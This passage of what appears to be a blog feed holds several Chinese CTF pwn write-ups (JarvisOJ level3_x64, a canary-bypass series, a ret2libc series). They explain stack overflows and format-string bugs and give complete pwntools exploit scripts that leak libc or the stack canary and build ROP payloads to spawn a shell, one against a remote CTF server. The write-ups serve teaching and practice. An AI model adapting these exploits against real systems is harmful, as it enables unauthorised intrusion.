p32(ebp)+ padding + 'a' * 112</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-JarvisOJ-Pwn-[XMAN]level3_x64</title>
      <link href="/2019/04/14/CTF-JarvisOJ-Pwn-%5BXMAN%5Dlevel3_x64/"/>
      <url>/2019/04/14/CTF-JarvisOJ-Pwn-%5BXMAN%5Dlevel3_x64/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="nc-pwn2-jarvisoj-com-9883"><a href="#nc-pwn2-jarvisoj-com-9883" class="headerlink" title="nc pwn2.jarvisoj.com 9883"></a>nc pwn2.jarvisoj.com 9883</h2><p>注意注意！这题有毒，so文件有问题的，请使用下载我给的so<br>so文件下载<a href="libc6_2.19-0ubuntu6.14_amd64.so">libc6_2.19-0ubuntu6.14_amd64.so</a><br>文件下载<a href="level3_x64.rar">level3_x64.rar</a></p><p>这题没有system函数也没有/bin/sh，而且为x64程序，传参较为复杂，所以难度还是有点，但是套路是不变的，慢慢调试最后也是可以拿到shell的。<br>这题其实可以使用DynELF的方法去做，但是我是用ROP直接做的，ROP方便调试</p><h3 id="溢出思路"><a href="#溢出思路" class="headerlink" title="溢出思路"></a>溢出思路</h3><p>read溢出到write_plt，然后溢出libc版本，然后在libc内找到system和/bin/sh，通过pop传参执行system拿到shell</p><h3 id="exploit-py"><a href="#exploit-py" class="headerlink" title="exploit.py"></a>exploit.py</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh=remote("pwn2.jarvisoj.com",9883)</span><br><span class="line">#sh = process ('./level3_x64')</span><br><span class="line">elf = ELF("level3_x64")</span><br><span class="line">libc = ELF("libc6_2.19-0ubuntu6.14_amd64.so")</span><br><span class="line">#libc = ELF("libc6_2.27-3ubuntu1_amd64.so")</span><br><span class="line">#-----------------------------------------------------------</span><br><span class="line">write_addr = elf.symbols['write']</span><br><span class="line">read_addr = elf.symbols['read']</span><br><span class="line">start_addr = elf.symbols['_start']</span><br><span class="line">__libc_start_main_addr = elf.got['__libc_start_main']</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">#0x00000000004006b3 : pop rdi ; ret</span><br><span class="line">pop_rdi_ret = 0x00000000004006b3</span><br><span class="line">#0x00000000004006b1 : pop rsi ; pop r15 ; ret</span><br><span class="line">pop_rsi_r15_ret = 0x00000000004006b1</span><br><span class="line">print "[+] _start_addr :" + hex(start_addr)</span><br><span class="line">print "[+] write_plt :" + hex(write_addr)</span><br><span class="line">print "[+] read_addr :" + hex(read_addr)</span><br><span class="line">print "[+] __libc_start_main_addr :" + hex(__libc_start_main_addr)</span><br><span class="line">#----------------------------------------------------------</span><br><span class="line">print read_addr</span><br><span class="line">payload =  'a' * 136 + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret)  + p64(__libc_start_main_addr) + p64(1)  + p64(write_addr) + p64(start_addr)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">ret_text = u64(sh.recv(8))</span><br><span class="line">system_addr = libc.symbols['system'] - (libc.symbols['__libc_start_main']-ret_text)+0x1B</span><br><span class="line">shell_addr = next(libc.search('/bin/sh\0')) - (libc.symbols['__libc_start_main'] - ret_text)</span><br><span class="line">payload = 'a'*136 + p64(pop_rdi_ret) + p64(shell_addr) + p64(system_addr)</span><br><span class="line">print "[+] __libc_start_main_addr value is " + hex(ret_text)</span><br><span class="line">print "[+]'/bin/sh' addr is "+hex(shell_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">#-----------------------------------------------------------</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Wiki-Canary系列</title>
      <link href="/2019/04/14/CTF-Wiki-Canary%E7%B3%BB%E5%88%97/"/>
      <url>/2019/04/14/CTF-Wiki-Canary%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="Canary原理和溢出原理"><a href="#Canary原理和溢出原理" class="headerlink" title="Canary原理和溢出原理"></a>Canary原理和溢出原理</h2><h3 id="知识点1、Canary是一种保护栈溢出的方式，原理就是向栈尾部中写入一个数据，如果函数执行完后要ret时，发现这个数据被修改了，说明栈溢出，跳转到退出函数，从而避免getShell。"><a href="#知识点1、Canary是一种保护栈溢出的方式，原理就是向栈尾部中写入一个数据，如果函数执行完后要ret时，发现这个数据被修改了，说明栈溢出，跳转到退出函数，从而避免getShell。" class="headerlink" title="知识点1、Canary是一种保护栈溢出的方式，原理就是向栈尾部中写入一个数据，如果函数执行完后要ret时，发现这个数据被修改了，说明栈溢出，跳转到退出函数，从而避免getShell。"></a>知识点1、Canary是一种保护栈溢出的方式，原理就是向栈尾部中写入一个数据，如果函数执行完后要ret时，发现这个数据被修改了，说明栈溢出，跳转到退出函数，从而避免getShell。</h3><h3 id="知识点2、若flag是存在服务器的内存里，假设你已经知道了这个字符串的内存地址，你可以主动的触发它的保护机制，保护机制会自动输出Canary位置的数据作为指针指向的内存，比如已知flag的内存地址是-0x08040100，可以构造-p32-0x08040100-50-，50只是我随意的打的，只要能覆盖到Canary即可。"><a href="#知识点2、若flag是存在服务器的内存里，假设你已经知道了这个字符串的内存地址，你可以主动的触发它的保护机制，保护机制会自动输出Canary位置的数据作为指针指向的内存，比如已知flag的内存地址是-0x08040100，可以构造-p32-0x08040100-50-，50只是我随意的打的，只要能覆盖到Canary即可。" class="headerlink" title="知识点2、若flag是存在服务器的内存里，假设你已经知道了这个字符串的内存地址，你可以主动的触发它的保护机制，保护机制会自动输出Canary位置的数据作为指针指向的内存，比如已知flag的内存地址是 0x08040100，可以构造 p32(0x08040100)*50 ，50只是我随意的打的，只要能覆盖到Canary即可。"></a>知识点2、若flag是存在服务器的内存里，假设你已经知道了这个字符串的内存地址，你可以主动的触发它的保护机制，保护机制会自动输出Canary位置的数据作为指针指向的内存，比如已知flag的内存地址是 0x08040100，可以构造 p32(0x08040100)*50 ，50只是我随意的打的，只要能覆盖到Canary即可。</h3><h3 id="知识点3、只要知道Canary，就可以绕过Canary的保护，即溢出Canary，再覆盖。"><a href="#知识点3、只要知道Canary，就可以绕过Canary的保护，即溢出Canary，再覆盖。" class="headerlink" title="知识点3、只要知道Canary，就可以绕过Canary的保护，即溢出Canary，再覆盖。"></a>知识点3、只要知道Canary，就可以绕过Canary的保护，即溢出Canary，再覆盖。</h3><pre><code>#### 溢出方法有两种，第一种是字符串格式漏洞，第二种是爆破Canary</code></pre><h3 id="知识点4、Canary在32位程序中以XXXXXX00格式出现，64位程序中XXXXXXXXXXXXXX00，且Canary自程序开始到结束中，任何Canary都是同样唯一的"><a href="#知识点4、Canary在32位程序中以XXXXXX00格式出现，64位程序中XXXXXXXXXXXXXX00，且Canary自程序开始到结束中，任何Canary都是同样唯一的" class="headerlink" title="知识点4、Canary在32位程序中以XXXXXX00格式出现，64位程序中XXXXXXXXXXXXXX00，且Canary自程序开始到结束中，任何Canary都是同样唯一的"></a>知识点4、Canary在32位程序中以XXXXXX00格式出现，64位程序中XXXXXXXXXXXXXX00，且Canary自程序开始到结束中，任何Canary都是同样唯一的</h3><p>第一种较为简单，若一个函数中出现read然后紧跟的是printf,然后继续跟着read，且printf的参数恰好为read中读入的参数，那么我们可以构造字符串使字符串连接到Canary，然后printf时，会连带的把Canary也一起输出出来。例如以下代码存在溢出</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">unsigned int vuln()</span><br><span class="line">{</span><br><span class="line">  signed int i; // [esp+4h] [ebp-74h]</span><br><span class="line">  char buf; // [esp+8h] [ebp-70h]</span><br><span class="line">  unsigned int v3; // [esp+6Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  for ( i = 0; i <= 1; ++i )</span><br><span class="line">  {</span><br><span class="line">    read(0, &buf, 0x200u);</span><br><span class="line">    printf(&buf);</span><br><span class="line">  }</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><p>在第一种方法中还存在一些额外情况，比如read中参数不足以连接到Canary，但是printf的参数还是和read中一样，那么我们可以使用格式化字符串，如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf("format", 输出表列)</span><br></pre></td></tr></tbody></table></figure></div><p>format参考列表</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%c：输出字符，配上%n可用于向指定地址写数据。</span><br><span class="line">%d：输出十进制整数，配上%n可用于向指定地址写数据。</span><br><span class="line">%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</span><br><span class="line">%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</span><br><span class="line">%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</span><br><span class="line">%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。</span><br><span class="line">%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</span><br></pre></td></tr></tbody></table></figure></div><p>我们可以先通过 AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x 来找到AAAA的位置 然后就可以计算偏移得到Canary的数据</p><h2 id="0x01-Canaryleak"><a href="#0x01-Canaryleak" class="headerlink" title="0x01 Canaryleak"></a>0x01 Canaryleak</h2><p><a href="canary">文件下载</a><br>程序源码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">// ex2.c</span><br><span class="line"></span><br><span class="line">#include <stdio.h></stdio.h></span><br><span class="line"></span><br><span class="line">#include <unistd.h></unistd.h></span><br><span class="line"></span><br><span class="line">#include <stdlib.h></stdlib.h></span><br><span class="line"></span><br><span class="line">#include <string.h></string.h></span><br><span class="line"></span><br><span class="line">void getshell(void) {</span><br><span class="line"></span><br><span class="line">    system("/bin/sh");</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">void init() {</span><br><span class="line"></span><br><span class="line">    setbuf(stdin, NULL);</span><br><span class="line"></span><br><span class="line">    setbuf(stdout, NULL);</span><br><span class="line"></span><br><span class="line">    setbuf(stderr, NULL);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">void vuln() {</span><br><span class="line"></span><br><span class="line">    char buf[100];</span><br><span class="line"></span><br><span class="line">    for(int i=0;i<2;i++){</span><br><span class="line"></span><br><span class="line">        read(0, buf, 0x200);</span><br><span class="line"></span><br><span class="line">        printf(buf);</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">int main(void) {</span><br><span class="line"></span><br><span class="line">    init();</span><br><span class="line"></span><br><span class="line">    puts("Hello Hacker!");</span><br><span class="line"></span><br><span class="line">    vuln();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h3 id="溢出思路"><a href="#溢出思路" class="headerlink" title="溢出思路"></a>溢出思路</h3><p>vuln中存在两次读入两次输出，由于开启了Canary，所以第一个读入要把读入的字符串连接上Canary，然后printf一并输出出来，第二个读入只需要带着Canary覆盖ret即可</p><h3 id="exploit-py"><a href="#exploit-py" class="headerlink" title="exploit.py"></a>exploit.py</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = process("./canary")</span><br><span class="line">elf = ELF("canary")</span><br><span class="line">getShell_addr = elf.symbols['getshell']</span><br><span class="line">payload = 'A'*100</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil('A'*100)</span><br><span class="line">canary = u32(sh.recv(4))-0xa</span><br><span class="line">print "[+] Canary: " + hex(canary)</span><br><span class="line">payload = 'A'*100 + p32(canary) + 'A'*12 + p32(getShell_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x02-格式化输出漏洞"><a href="#0x02-格式化输出漏洞" class="headerlink" title="0x02 格式化输出漏洞"></a>0x02 格式化输出漏洞</h2><p>程序源码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include<stdio.h></stdio.h></span><br><span class="line"></span><br><span class="line">void canary_protect_me(void){</span><br><span class="line"></span><br><span class="line">    system("/bin/sh");</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">int main(void){</span><br><span class="line"></span><br><span class="line">    setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line"></span><br><span class="line">    setvbuf(stdin, 0LL, 1, 0LL);</span><br><span class="line"></span><br><span class="line">    char buf[40];</span><br><span class="line"></span><br><span class="line">    gets(buf);</span><br><span class="line"></span><br><span class="line">    printf(buf);//存在格式化漏洞</span><br><span class="line"></span><br><span class="line">    gets(buf);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h3 id="溢出思路-1"><a href="#溢出思路-1" class="headerlink" title="溢出思路"></a>溢出思路</h3><p>先输入 AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x<br>发现第5个是61616161（AAAA），然后ida中分析到buf到Canary是40偏移，然后只需要带着Canary覆盖EIP即可<br>过程：先输入 AAAA%5$x 获取Canary，取出后四位，带着这四位数据覆盖EIP</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = process("pwn200")</span><br><span class="line">input()</span><br><span class="line">elf = ELF("pwn200")</span><br><span class="line">getShell_addr = elf.symbols['canary_protect_me']</span><br><span class="line">print "[+] getShell_addr:" + hex(getShell_addr)</span><br><span class="line">payload = 'AAAA%15$x'</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil("AAAA")</span><br><span class="line">Canary = int(sh.recv(8),16)</span><br><span class="line">print "[+] Get Canary :"+ hex(Canary)</span><br><span class="line">payload = 'A' * 40 + p32(Canary)*4 + p32(getShell_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Wiki-ret2libc系列</title>
      <link href="/2019/04/13/CTF-Wiki-ret2libc%E7%B3%BB%E5%88%97/"/>
      <url>/2019/04/13/CTF-Wiki-ret2libc%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="0x01-ret2libc1"><a href="#0x01-ret2libc1" class="headerlink" title="0x01 ret2libc1"></a>0x01 ret2libc1</h2><p><a href="/2019/04/13/CTF-Wiki-ret2libc%E7%B3%BB%E5%88%97/ret2libc1" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/13/CTF-Wiki-ret2libc%E7%B3%BB%E5%88%97/ret2libc1" class="lazyload"></a><br>ida导入后的main函数如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">{</span><br><span class="line">  char s; // [esp+1Ch] [ebp-64h]</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(_bss_start, 0, 1, 0);</span><br><span class="line">  puts("RET2LIBC >_<");</span><br><span class="line">  gets(&s);</span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><p>然后我们发现有plt表中有system<br>在linux中用checksec查看保护</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></tbody></table></figure></div><p>ida中按shift+F12 然后查看字符串发现/bin/sh<br>如果要用过gdb查找的话 只需要输入 search /bin/sh<br><a href="/2019/04/13/CTF-Wiki-ret2libc%E7%B3%BB%E5%88%97/4.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/13/CTF-Wiki-ret2libc%E7%B3%BB%E5%88%97/4.png" class="lazyload"></a></p><p>我们通过cyclic直接算出溢出偏移</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cyclic 500</span><br><span class="line">将产生的字符串输入到程序中，通过gdb就可以得到地址</span><br><span class="line">然后再通过 cyclic -l ret_addr 就可以算出偏移</span><br><span class="line"></span><br><span class="line">经过测试</span><br><span class="line">cyclic -l 0x62616164</span><br><span class="line">偏移算出为 112</span><br></pre></td></tr></tbody></table></figure></div><h3 id="溢出思路"><a href="#溢出思路" class="headerlink" title="溢出思路"></a>溢出思路</h3><p>第一次gets，将ret覆盖直接到system的位置，并且传入/bin/sh的地址，由于只需要一次ret，所以我们不需要设置padding</p><h3 id="exploit-py"><a href="#exploit-py" class="headerlink" title="exploit.py"></a>exploit.py</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process("./ret2libc1")</span><br><span class="line">elf = ELF("ret2libc1")</span><br><span class="line">system_addr = elf.plt['system']</span><br><span class="line">shell_addr = 0x8049720</span><br><span class="line">payload = flat(['a'*112,system_addr,'0'*4,shell_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2019/04/13/CTF-Wiki-ret2libc%E7%B3%BB%E5%88%97/5.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/13/CTF-Wiki-ret2libc%E7%B3%BB%E5%88%97/5.png" class="lazyload"></a></p><h2 id="0x02-ret2libc2"><a href="#0x02-ret2libc2" class="headerlink" title="0x02 ret2libc2"></a>0x02 ret2libc2</h2><p>文件导入ida后，发现有system函数但是没有现有的”/bin/sh”，所以需要通过gets函数在bbs中输入该字符串，然后跳转到system函数<br>获取溢出的字符串长度方法和0x01中的方法相同<br>由于有第二次ret，所以我们需要设置padding，也就是pop edx<br>查找的方法可以用ROPgadget</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ret2libc2 --only "pop|ret"</span><br><span class="line"></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0804872f : pop ebp ; ret</span><br><span class="line">0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0804843d : pop ebx ; ret //这个就合适，因为我们只有一个数据需要pop掉</span><br><span class="line">0x0804872e : pop edi ; pop ebp ; ret</span><br><span class="line">0x0804872d : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x08048426 : ret</span><br><span class="line">0x0804857e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 7</span><br></pre></td></tr></tbody></table></figure></div><h3 id="exploit-py-1"><a href="#exploit-py-1" class="headerlink" title="exploit.py"></a>exploit.py</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line">sh = process("./ret2libc2")</span><br><span class="line">elf = ELF("ret2libc2")</span><br><span class="line">system_addr = elf.plt['system']</span><br><span class="line">gets_addr = elf.plt['gets']</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">pop_edx = 0x0804843D</span><br><span class="line">payload = flat([112*'a',gets_addr,pop_edx,bss_addr,system_addr,'a'*4,bss_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">time.sleep(1)</span><br><span class="line">sh.sendline("//bin//sh");</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2019/04/13/CTF-Wiki-ret2libc%E7%B3%BB%E5%88%97/6.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/13/CTF-Wiki-ret2libc%E7%B3%BB%E5%88%97/6.png" class="lazyload"></a></p><h2 id="0x03-ret2libc3"><a href="#0x03-ret2libc3" class="headerlink" title="0x03 ret2libc3"></a>0x03 